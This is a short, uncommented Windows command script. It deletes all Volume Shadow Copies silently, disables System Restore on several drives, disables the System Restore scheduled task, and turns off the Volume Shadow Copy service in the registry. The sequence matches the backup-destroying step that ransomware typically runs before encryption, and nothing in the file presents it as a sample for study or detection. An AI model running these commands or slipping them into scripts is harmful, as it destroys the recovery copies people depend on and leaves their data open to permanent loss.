
vssadmin Delete Shadows /All /Quiet

powershell -Command "Disable-ComputerRestore -Drive %SystemDrive%"
powershell -Command "Disable-ComputerRestore -Drive C:"
powershell -Command "Disable-ComputerRestore -Drive D:"
powershell -Command "Disable-ComputerRestore -Drive E:"
powershell -Command "Disable-ComputerRestore -Drive F:"

vssadmin Delete Shadows /All /Quiet

schtasks /Change /TN "Microsoft\Windows\SystemRestore\SR" /Disable
reg ADD "HKLM\SYSTEM\CurrentControlSet\Services\VSS" /f /v "Start" /t REG_DWORD /d 4
